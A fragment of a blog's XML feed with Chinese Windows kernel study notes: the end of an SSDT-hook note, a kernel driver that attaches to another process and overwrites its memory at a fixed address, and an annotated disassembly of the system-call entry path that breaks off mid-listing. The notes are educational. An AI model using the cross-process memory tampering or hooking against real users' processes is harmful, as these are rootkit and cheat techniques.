src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E9%A9%B1%E5%8A%A8/4.png?x-oss-process=style/yangruiqi.com" alt="image"></p>]]></content>
      
      <categories>
          
          <category> 笔记 - Hook笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核学习 </tag>
            
            <tag> SSDT—Hook </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>通过进程挂靠实现改其它进程的数据</title>
      <link href="/2018/06/30/%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8B%E6%8C%82%E9%9D%A0%E5%AE%9E%E7%8E%B0%E6%94%B9%E5%85%B6%E5%AE%83%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%95%B0%E6%8D%AE/"/>
      <url>/2018/06/30/%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8B%E6%8C%82%E9%9D%A0%E5%AE%9E%E7%8E%B0%E6%94%B9%E5%85%B6%E5%AE%83%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%95%B0%E6%8D%AE/</url>
      <content type="html"><![CDATA[<p>0环下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ntifs.h&gt;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver);</span><br><span class="line">// 根据PID返回进程EPROCESS，失败返回NULL</span><br><span class="line">PEPROCESS LookupProcess(HANDLE hPid)</span><br><span class="line">&#123;</span><br><span class="line">    PEPROCESS pEProcess = NULL;</span><br><span class="line">    if (NT_SUCCESS(PsLookupProcessByProcessId(</span><br><span class="line">        hPid, &amp;pEProcess)))</span><br><span class="line">        return pEProcess;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID ChangeData(ULONG uId)</span><br><span class="line">&#123;</span><br><span class="line">    KAPC_STATE ks;</span><br><span class="line"></span><br><span class="line">    //1 根据ID获得进程内核对象</span><br><span class="line">    PEPROCESS pEprocess = LookupProcess((HANDLE)uId);</span><br><span class="line"></span><br><span class="line">    //2 挂靠到此进程上去</span><br><span class="line">    //需要注意：不能挂靠之后，将内存中的数据往用户层地址存储，是不对的。</span><br><span class="line">    //因为当挂靠到目标进程之后，用户层地址就是目标进程的了，也就存储到</span><br><span class="line">    //目标进程中，而且目标进程的那个地址不一定有效，可能造成崩溃。</span><br><span class="line">    KeStackAttachProcess(</span><br><span class="line">        pEprocess,</span><br><span class="line">        &amp;ks</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    //3 修改内存</span><br><span class="line">    char * p = (char *)0x1dfaf0;</span><br><span class="line">    p[5] = &apos;h&apos;;</span><br><span class="line">    p[6] = &apos;a&apos;;</span><br><span class="line">    p[7] = &apos;h&apos;;</span><br><span class="line">    p[8] = &apos;a&apos;;</span><br><span class="line">    p[9] = &apos;\0&apos;;</span><br><span class="line">    //4 解除挂靠</span><br><span class="line">    KeUnstackDetachProcess(&amp;ks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPath)</span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pPath);</span><br><span class="line">    DbgBreakPoint();</span><br><span class="line"></span><br><span class="line">    ChangeData(1716);</span><br><span class="line"></span><br><span class="line">    pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT pDriver)</span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pDriver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>3环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    char *ch = &quot;allenboy&quot;;</span><br><span class="line">    printf(&quot;%c,%x&quot;, ch, ch);</span><br><span class="line">    getchar();</span><br><span class="line">    printf(&quot;%c,%x&quot;, ch, ch);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 笔记 - 驱动学习编辑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核学习 </tag>
            
            <tag> 进次挂靠 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>系统调用笔记下</title>
      <link href="/2018/06/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AC%94%E8%AE%B0%E4%B8%8B/"/>
      <url>/2018/06/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AC%94%E8%AE%B0%E4%B8%8B/</url>
      <content type="html"><![CDATA[<h1 id="API函数的调用过程（SystemServiceTable）"><a href="#API函数的调用过程（SystemServiceTable）" class="headerlink" title="API函数的调用过程（SystemServiceTable）"></a>API函数的调用过程（SystemServiceTable）</h1><p>在上中，讲到进0环后，3环的各种寄存器都会保留到<br>_Trap_Frame结构体中，这篇我讲解</p><p>如何根据系统服务号(eax中存储)找到要执行的内核函数？<br>调用时参数是存储到3环的堆栈，如何传递给内核函数？</p><h2 id="SystemServiceTable-系统服务表"><a href="#SystemServiceTable-系统服务表" class="headerlink" title="SystemServiceTable 系统服务表"></a>SystemServiceTable 系统服务表</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/8.png" alt="系统服务表"><br>ServiceTable存了系统服务表里函数地址表（4字节）<br>Count是当前系统服务表被调用了几次<br>serviceLimit存了有多少个函数<br>ArgmentTable存了有多少个参数（以字节为单位，比如穿了2个参数，每个参数4字节，所以这里存8，一个单元1字节）<br>绿色的是导出的函数      </p><p>黄色结构是一样的，区别就是绿色的是Ntoskrl.exe的，黄色的是Win32k.sys（图形显示之类的模块）的。   </p><p>那么程序执行的时候去哪找系统服务表，是_KTHREAD的偏移0xE0处。</p><p>下面系统服务号eax怎么找这个对应的函数呢，虽然eax32位，真正使用的只有13位，如下</p><h2 id="判断要调用的函数在哪个表"><a href="#判断要调用的函数在哪个表" class="headerlink" title="判断要调用的函数在哪个表"></a>判断要调用的函数在哪个表</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/10.png" alt="系统服务号"><br>低12位找对应偏移的函数，相同维序的参数表就是这个函数的参数。<br>下面来分析代码，2种调用除了开始寄存器保存不一样（KiSystemServer多做了一些读取内存寄存器的操作），后来都执行相同的代码所以直接开始分析KiSystemServer执行完跳转到KiFastCallEntry里的代码</p><p>下面先列一下不同于KiSystemServer，KiFastCallEntry多用到的结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTSS</span><br><span class="line">nt!_KTSS</span><br><span class="line">   +0x000 Backlink         : Uint2B</span><br><span class="line">   +0x002 Reserved0        : Uint2B</span><br><span class="line">   +0x004 Esp0             : Uint4B</span><br><span class="line">   +0x008 Ss0              : Uint2B</span><br><span class="line">   +0x00a Reserved1        : Uint2B</span><br><span class="line">   +0x00c NotUsed1         : [4] Uint4B</span><br><span class="line">   +0x01c CR3              : Uint4B</span><br><span class="line">   +0x020 Eip              : Uint4B</span><br><span class="line">   +0x024 EFlags           : Uint4B</span><br><span class="line">   +0x028 Eax              : Uint4B</span><br><span class="line">   +0x02c Ecx              : Uint4B</span><br><span class="line">   +0x030 Edx              : Uint4B</span><br><span class="line">   +0x034 Ebx              : Uint4B</span><br><span class="line">   +0x038 Esp              : Uint4B</span><br><span class="line">   +0x03c Ebp              : Uint4B</span><br><span class="line">   +0x040 Esi              : Uint4B</span><br><span class="line">   +0x044 Edi              : Uint4B</span><br><span class="line">   +0x048 Es               : Uint2B</span><br><span class="line">   +0x04a Reserved2        : Uint2B</span><br><span class="line">   +0x04c Cs               : Uint2B</span><br><span class="line">   +0x04e Reserved3        : Uint2B</span><br><span class="line">   +0x050 Ss               : Uint2B</span><br><span class="line">   +0x052 Reserved4        : Uint2B</span><br><span class="line">   +0x054 Ds               : Uint2B</span><br><span class="line">   +0x056 Reserved5        : Uint2B</span><br><span class="line">   +0x058 Fs               : Uint2B</span><br><span class="line">   +0x05a Reserved6        : Uint2B</span><br><span class="line">   +0x05c Gs               : Uint2B</span><br><span class="line">   +0x05e Reserved7        : Uint2B</span><br><span class="line">   +0x060 LDT              : Uint2B</span><br><span class="line">   +0x062 Reserved8        : Uint2B</span><br><span class="line">   +0x064 Flags            : Uint2B</span><br><span class="line">   +0x066 IoMapBase        : Uint2B</span><br><span class="line">   +0x068 IoMaps           : [1] _KiIoAccessMap</span><br><span class="line">   +0x208c IntDirectionMap  : [32] UChar</span><br></pre></td></tr></table></figure><p>FS寄存器，在用户层的时候，指向的是TEB，在内核层的时候，指向的是KPC<br>下面是通过IDA观察的_KiSystemService函数   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">.text:0043567E _KiSystemService proc near              ; CODE XREF: ZwAcceptConnectPort(x,x,x,x,x,x)+Cp</span><br><span class="line">.text:0043567E                                         ; ZwAccessCheck(x,x,x,x,x,x,x,x)+Cp ...</span><br><span class="line">.text:0043567E</span><br><span class="line">.text:0043567E arg_0           = dword ptr  4</span><br><span class="line">.text:0043567E</span><br><span class="line">.text:0043567E                 push    0               ; _KTRAP_FRAME +0x064 ErrCode</span><br><span class="line">.text:00435680                 push    ebp             ; 0x060 Ebp,3环寄存器入栈</span><br><span class="line">.text:00435681                 push    ebx             ; 0x05C,ebx</span><br><span class="line">.text:00435682                 push    esi             ; 0x058 Esi</span><br><span class="line">.text:00435683                 push    edi             ; 0x054 Edi</span><br><span class="line">.text:00435684                 push    fs              ; 0x050 SegFs</span><br><span class="line">.text:00435686                 mov     ebx, 30h        ; 为FS寄存器赋值,30就是段选择子，在GDTR找到相应的段描述符，加载到，FS，指向KPCR结构体</span><br><span class="line">.text:0043568B                 mov     fs, bx          ; Windows内核有个特殊的基本要求，就是只要CPU在内核运行，就得使</span><br><span class="line">.text:0043568B                                         ; mov ebx,30 //0011 0000  所以就是0环GDT索引6</span><br><span class="line">.text:0043568B                                         ; mov fs,bx</span><br><span class="line">.text:0043568B                                         ;</span><br><span class="line">.text:0043568B                                         ; 0环的FS.Base指向CPU自己的KPCR，不是指向当前线程</span><br><span class="line">.text:0043568B                                         ; 选择码，0x30的结构分析如下：</span><br><span class="line">.text:0043568B                                         ; 1.bit0~bit1:RPL,Requested Privilege Level,要求运行的级别，这里是0</span><br><span class="line">.text:0043568B                                         ; 2.bit2：找GDT还是IDT，这里是0，GDT</span><br><span class="line">.text:0043568B                                         ; 3.bit3！bit15，是在GDT或者IDT的下标</span><br><span class="line">.text:0043568B                                         ; windbg查看段描述符：834093f2 dc003748</span><br><span class="line">.text:0043568B                                         ; Base:83f2dc00 指向当前的_KPCR</span><br><span class="line">.text:0043568E                 mov     ebx, 23h</span><br><span class="line">.text:00435693                 mov     ds, ebx</span><br><span class="line">.text:00435695                 mov     es, ebx</span><br><span class="line">.text:00435697                 mov     esi, large fs:124h ; 查看下KPCR偏移124h是什么，查训发现是当前CPU所执行线程的_ETHREAD</span><br><span class="line">.text:0043569E                 push    large dword ptr fs:0 ; 保存老的ExceptionList</span><br><span class="line">.text:0043569E                                         ; _KPCR偏移+0x00-&gt;NT_TIB-&gt;ExceptionList</span><br><span class="line">.text:004356A5                 mov     large dword ptr fs:0, 0FFFFFFFFh ; 新的ExceptonList为空白，因为3环的异常链表，不能用，要进0环了</span><br><span class="line">.text:004356B0                 push    dword ptr [esi+13Ah] ; 因为Esi存的_KTHREAD,他的偏移13A存的PreviousMode,</span><br><span class="line">.text:004356B0                                         ; 就是保存老的先前模式到堆栈</span><br><span class="line">.text:004356B0                                         ; 先前模式就是当调用这些代码时候，原来是几环的数就是几，比如原来0环，先前模式就是0，原来3环就是1</span><br><span class="line">.text:004356B0                                         ; 因为有些内核代码可以从0和3调用，但是执行内容不一样，通过这个知道执行什么。</span><br><span class="line">.text:004356B6                 sub     esp, 48h        ; ESP 提升到_KTRAP_FRAME结构体第一个成员，也就是这个结构体指针</span><br><span class="line">.text:004356B9                 mov     ebx, [esp+68h+arg_0] ; 查了下这个位置是3环CS</span><br><span class="line">.text:004356B9                                         ; 所以这句是取出3环压入的参数CS _KTRAP_FRAME + 0x6C</span><br><span class="line">.text:004356BD                 and     ebx, 1          ; 上面的CS跟1与运算</span><br><span class="line">.text:004356BD                                         ; 0环最低位是0,3环最低位为1</span><br><span class="line">.text:004356C0                 mov     [esi+13Ah], bl  ; 上面的运算结果存到esi+0x13Ah这个位置的偏移，就是新的&quot;先前模式&quot;</span><br><span class="line">.text:004356C6                 mov     ebp, esp        ; 抬高栈针,ebp=esp=_KTRAP_FRAME指针</span><br><span class="line">.text:004356C8                 mov     ebx, [esi+128h] ; _KTHTEAD中的TrapFrame给ebx</span><br><span class="line">.text:004356CE                 mov     [ebp+3Ch], ebx  ; 将_KTHREAD中的Trap_Frame暂时存在这个位置后面</span><br><span class="line">.text:004356CE                                         ; //会将这个值取出来，重新恢复给_KTHREAD的Trap_Frame</span><br><span class="line">.text:004356CE                                         ;</span><br><span class="line">.text:004356CE                                         ; 零时存在这</span><br><span class="line">.text:004356D1                 and     dword ptr [ebp+2Ch], 0 ; Dr7清0</span><br><span class="line">.text:004356D5                 test    byte ptr [esi+3], 0DFh ; 查看当前线程是否处于调试状态</span><br><span class="line">.text:004356D5                                         ; 看看是不是-1，</span><br><span class="line">.text:004356D9                 mov     [esi+128h], ebp ; 因为有改变堆栈中的_KTRAP_FRAME,将其重新赋值给_KTHREAD中的TRAPFRAME</span><br><span class="line">.text:004356DF                 cld</span><br><span class="line">.text:004356E0                 jnz     Dr_kss_a        ; 处于调试的话跳转,跳转那边的代码是讲调试寄存器都存到Trap_Frame里</span><br><span class="line">.text:004356E6</span><br><span class="line">.text:004356E6 loc_4356E6:                             ; CODE XREF: Dr_kss_a+Dj</span><br><span class="line">.text:004356E6                                         ; Dr_kss_a+79j</span><br><span class="line">.text:004356E6                 mov     ebx, [ebp+60h]  ; 3环的EPB给ebx</span><br><span class="line">.text:004356E9                 mov     edi, [ebp+68h]  ; 3环的Eip</span><br><span class="line">.text:004356EC                 mov     [ebp+0Ch], edx  ; edx存的3环参数指针：</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; _kiFastSystemCall函数</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; mov edx，esp</span><br><span class="line">.text:004356EC                                         ;</span><br><span class="line">.text:004356EC                                         ; sysenter</span><br><span class="line">.text:004356EF                 mov     dword ptr [ebp+8], 0BADB0D00h ; 这个是操作系统的标志</span><br><span class="line">.text:004356F6                 mov     [ebp+0], ebx    ; 3环的ebp存储到KTRAP_FRAME+0x000 DbgEbp的位置</span><br><span class="line">.text:004356F9                 mov     [ebp+4], edi    ; 3环的ebp存储到KTRAP_FRAME+0x004 DbgEip的位置</span><br><span class="line">.text:004356FC                 sti</span><br><span class="line">.text:004356FD                 jmp     loc_4357DF      ; 跳到KiFastCallEntry</span><br><span class="line">.text:004356FD _KiSystemService endp</span><br><span class="line">.text:004356FD</span><br><span class="line">.text:00435702</span><br><span class="line">.text:00435702 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00435702</span><br><span class="line">.text:00435702</span><br><span class="line">.text:00435702 _KiFastCallEntry2 proc near             ; DATA XREF: _KiTrap01:loc_436724o</span><br><span class="line">.text:00435702                 mov     ecx, 30h</span><br><span class="line">.text:00435707                 mov     fs, ecx</span><br><span class="line">.text:00435709                 mov     ecx, 23h</span><br><span class="line">.text:0043570E                 mov     ds, ecx</span><br><span class="line">.text:00435710                 mov     es, ecx</span><br><span class="line">.text:00435712                 mov     ecx, large fs:40h</span><br><span class="line">.text:00435719                 mov     esp, [ecx+4]</span><br><span class="line">.text:0043571C                 push    23h</span><br><span class="line">.text:0043571E                 push    edx</span><br><span class="line">.text:0043571F                 pushf</span><br><span class="line">.text:00435720                 or      byte ptr [esp+1], 1</span><br><span class="line">.text:00435725                 jmp     short loc_43576B ; Sanitize eflags, clear direction, NT etc;设置eflags为2,,表示所有标志位都是0(中断被关闭)，就是清除所有标志位</span><br><span class="line">.text:00435725 _KiFastCallEntry2 endp</span><br><span class="line">.text:00435725</span><br><span class="line">.text:00435727 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00435727 ; START OF FUNCTION CHUNK FOR _KiFastCallEntry</span><br><span class="line">.text:00435727</span><br><span class="line">.text:00435727 loc_435727:                             ; CODE XREF: _KiFastCallEntry:loc_43574Bj</span><br><span class="line">.text:00435727                 mov     ecx, large fs:40h</span><br><span class="line">.text:0043572E                 mov     esp, [ecx+4]</span><br><span class="line">.text:00435731                 push    0</span><br><span class="line">.text:00435733                 push    0</span><br><span class="line">.text:00435735                 push    0</span><br><span class="line">.text:00435737                 push    0</span><br><span class="line">.text:00435739                 push    23h</span><br><span class="line">.text:0043573B                 push    0</span><br><span class="line">.text:0043573D                 push    20202h</span><br><span class="line">.text:00435742                 push    1Bh</span><br><span class="line">.text:00435744                 push    0</span><br><span class="line">.text:00435746                 jmp     _KiTrap06</span><br><span class="line">.text:0043574B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0043574B</span><br><span class="line">.text:0043574B loc_43574B:                             ; CODE XREF: _KiFastCallEntry+62j</span><br><span class="line">.text:0043574B                 jmp     short loc_435727</span><br><span class="line">.text:0043574B ; END OF FUNCTION CHUNK FOR _KiFastCallEntry</span><br><span class="line">.text:0043574B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0043574D                 align 10h</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750 ; ;此时:</span><br><span class="line">.text:00435750 ; ;eax指向服务编号</span><br><span class="line">.text:00435750 ; ;edx指向当前用户栈,edx+8为参数列表</span><br><span class="line">.text:00435750 ;</span><br><span class="line">.text:00435750 ; KGDT_R3_DATA OR RPL_MASK  给ecx</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750 _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+21o</span><br><span class="line">.text:00435750                                         ; _KiTrap01+71o</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750 var_7C          = dword ptr -7Ch</span><br><span class="line">.text:00435750 var_B           = byte ptr -0Bh</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750 ; FUNCTION CHUNK AT .text:00435727 SIZE 00000026 BYTES</span><br><span class="line">.text:00435750 ; FUNCTION CHUNK AT .text:00435A75 SIZE 00000014 BYTES</span><br><span class="line">.text:00435750 ; FUNCTION CHUNK AT .text:00435BCB SIZE 00000038 BYTES</span><br><span class="line">.text:00435750 ; FUNCTION CHUNK AT .text:00435C04 SIZE 0000001A BYTES</span><br><span class="line">.text:00435750</span><br><span class="line">.text:00435750                 mov     ecx, 23h</span><br><span class="line">.text:00435755                 push    30h             ; 这里的30是KGDT_R0_PCR，也就是0环的GDT的PCR，要给fs，使fs指向KPCR</span><br><span class="line">.text:00435757                 pop     fs              ; 为FS寄存器赋值,30就是段选择子，在GDTR找到相应的段描述符，加载到，FS，指向KPCR结构体</span><br><span class="line">.text:00435759                 mov     ds, ecx         ; ds指向用户数据段</span><br><span class="line">.text:0043575B                 mov     es, ecx         ; es指向用户数据段</span><br><span class="line">.text:0043575D                 mov     ecx, large fs:40h ; 传说中的TSS，保存了一大堆寄存器的值</span><br><span class="line">.text:00435764                 mov     esp, [ecx+4]    ; tts中获得当前线程堆栈的esp,0环ESP给ESP</span><br><span class="line">.text:00435767                 push    23h             ; 23是 KGDT_R3_DATA OR RPL_MASK   ; Push user SS(压入用户态线程的堆栈段寄存器ss)</span><br><span class="line">.text:00435769                 push    edx             ; edx,参数入栈,</span><br><span class="line">.text:00435769                                         ; edx保存的是用户层的堆栈，也就是Push ESP(压入esp)</span><br><span class="line">.text:0043576A                 pushf                   ; 压入标志寄存器</span><br><span class="line">.text:0043576B</span><br><span class="line">.text:0043576B loc_43576B:                             ; CODE XREF: _KiFastCallEntry2+23j</span><br><span class="line">.text:0043576B                 push    2               ; Sanitize eflags, clear direction, NT etc;设置eflags为2,,表示所有标志位都是0(中断被关闭)，就是清除所有标志位</span><br><span class="line">.text:0043576D                 add     edx, 8          ; edx+8就是dex移动到了参数位置</span><br><span class="line">.text:00435770                 popf                    ; .errnz(EFLAGS_INTERRUPT_MASK AND 0FFFF00FFh)</span><br><span class="line">.text:00435771                 or      [esp+0Ch+var_B], 2 ; or byte ptr [esp+1], EFLAGS_INTERRUPT_MASK/0100h ; Enable interrupts in eflags(打开用户态eflags的中断)</span><br><span class="line">.text:00435776                 push    1Bh             ; Push user CS</span><br><span class="line">.text:00435778                 push    dword ptr ds:0FFDF0304h ; push return address(使其返回时指向用户空间</span><br><span class="line">.text:00435778                                         ; push dword ptr ds:[USER_SHARED_DATA+UsSystemCallReturn] ;</span><br><span class="line">.text:0043577E                 push    0               ; put pad dword for error on stack</span><br><span class="line">.text:00435780                 push    ebp             ;  save the non-volatile registers</span><br><span class="line">.text:00435781                 push    ebx</span><br><span class="line">.text:00435782                 push    esi</span><br><span class="line">.text:00435783                 push    edi             ; 保存现场</span><br><span class="line">.text:00435784                 mov     ebx, large fs:1Ch ; Ptr32 _KPCR     指向KPCR自己</span><br><span class="line">.text:0043578B                 push    3Bh             ; Push user mode FS</span><br><span class="line">.text:0043578B                                         ; push KGDT_R3_TEB OR RPL_MASK</span><br><span class="line">.text:0043578D                 mov     esi, [ebx+124h] ; esi为指向当前线程的结构体KTHREAD</span><br><span class="line">.text:00435793                 push    dword ptr [ebx] ; 吧KPCR入栈</span><br><span class="line">.text:00435795                 mov     dword ptr [ebx], 0FFFFFFFFh ; ebx等于-1</span><br><span class="line">.text:0043579B                 mov     ebp, [esi+28h]  ; 这个位置是InitialStack</span><br><span class="line">.text:0043579B                                         ; 使ebp指向当前线程堆栈的栈顶</span><br><span class="line">.text:0043579E                 push    1               